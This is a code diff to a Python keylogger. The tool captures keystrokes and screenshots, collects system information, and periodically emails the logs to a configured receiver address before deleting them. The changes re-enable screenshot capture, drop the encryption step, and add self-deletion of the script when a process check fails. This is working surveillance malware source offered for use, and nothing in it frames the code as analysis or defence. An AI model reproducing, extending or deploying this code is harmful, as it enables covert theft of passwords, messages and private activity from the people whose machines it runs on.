@@ -6,21 +6,22 @@ try:
   import subprocess
   import os
   import time
+  import psutil
   import pyscreenshot
   import smtplib
-  import config
 
   from pynput.keyboard import Key, Listener
   from random import randint
   from requests import get
   from PIL import ImageGrab
   from email.mime.base import MIMEBase
+  from Config import config
   from email.mime.multipart import MIMEMultipart
   from email.mime.text import MIMEText
   from email import encoders
   from cryptography.fernet import Fernet
 except ModuleNotFoundError:
-  modules = ['pyscreenshot', 'smtplib', 'PIL', 'pynput']
+  modules = ['pyscreenshot', 'smtplib', 'PIL', 'pynput', 'psutil']
   subprocess.call('pip install' + ' '.join(modules), shell=True)
 
 class KeyLog():
@@ -203,7 +204,7 @@ SENDER_EMAIL_ADDR = ""    # set sender's email address
 SENDER_PASS = ""          # set sender's password
 
 # Receiver's email
-RECEIVER_EMAIL_ADDR = ""  # set reciever's address''')
+RECEIVER_EMAIL_ADDR = ""  # set receiver's address''')
     with open ("config.py", "w") as configFile:
       configFile.write(newVar)
 
@@ -217,13 +218,26 @@ RECEIVER_EMAIL_ADDR = ""  # set reciever's address''')
     except OSError:
       pass
 
+  # CHECKING PROCESS STATUS
+  def processWorkingOrNot(self, filename_of_process):
+    for i in psutil.process_iter():
+      if i.name() == filename_of_process:
+        newVal = 222
+        break
+      else:
+        newVal = 999
+        continue       
+    return newVal
+
   # TIMER FOR SENDING LOGS
   def sendLogsAt(self):
     self.log_computerInfo()
-    # self.screenshotWinMacLin()   
-    print(self.list_of_files)
+    self.screenshotWinMacLin()   
     self.list_of_files = os.listdir(os.path.abspath(self.LOGS_FILE_DIRECTORY))
-    self.send_recorded_logs(self.FROM_ADDR, self.TO_ADDR, self.list_of_files)
+    if self.list_of_files:
+      self.send_recorded_logs(self.FROM_ADDR, self.TO_ADDR, self.list_of_files)
+    else:
+      pass
     time.sleep(5)
     self.deleteAllFiles()
     setTimer = threading.Timer(self.REPORT_TIME, self.sendLogsAt)
@@ -264,32 +278,44 @@ RECEIVER_EMAIL_ADDR = ""  # set reciever's address''')
           clean_file.write(clean_key)
         except Exception:
           pass    
-      clean_file.close()
-    # Encrypt Data file
-    self.encryptFile(self.KEY_VALUE, self.clean_data, self.clean_data)
+      clean_file.close()    
   
   def mainModule(self):
-    key_listener = Listener(on_press = self.on_press, )
+    key_listener = Listener(on_press = self.on_press )
     with key_listener:
       try:
-        self.list_of_files = os.listdir(os.path.abspath(self.LOGS_FILE_DIRECTORY))        
+        # SENDING LOGS
+        self.list_of_files = os.listdir(os.path.abspath(self.LOGS_FILE_DIRECTORY))
         self.sendLogsAt()
       except Exception as e:
-        print("[-] Oops Error -- ", e)
-      time.sleep(2)
-      key_listener.join()
+        print("[-] Oops Error -- ", e)  
+      key_listener.join()   # LISTENING TO KEYSTROKES
+      
+      # CHECKING KEYLOGGER IS RUNNING ELSE DELETING THE FILE.
       if self.WORKING_OS == 'Windows':
-        pass
+        name_of_running_file = os.path.basename(__file__)
+        procW = self.processWorkingOrNot(name_of_running_file)
+        if procW == 999:
+          try:
+            os.system("DEL " + os.path.basename(__file__))
+          except Exception:
+            pass
       elif self.WORKING_OS == 'Linux':
         try:
-          keylogger_process = subprocess.check_output(f"ps -ef | grep {os.path.basename(__file__)}", shell=True).decode()
-          if __file__ not in keylogger_process:
-            self.updateConfigFile()
+          name_of_running_file = os.path.splitext(__file__)[0]
+          procL = self.processWorkingOrNot(name_of_running_file)
+          if procL == 999:            
+            try:
+              os.system("rm -rf" + os.path.basename(__file__))
+            except Exception:
+              pass
+          else:
+            pass
         except Exception:
           pass
-        else:
-          pass
+      else:
+        pass
 
-
-keylogClass = KeyLog()
-keylogClass.mainModule()
+if __name__ == '__main__':
+  keylogClass = KeyLog()
+  keylogClass.mainModule()
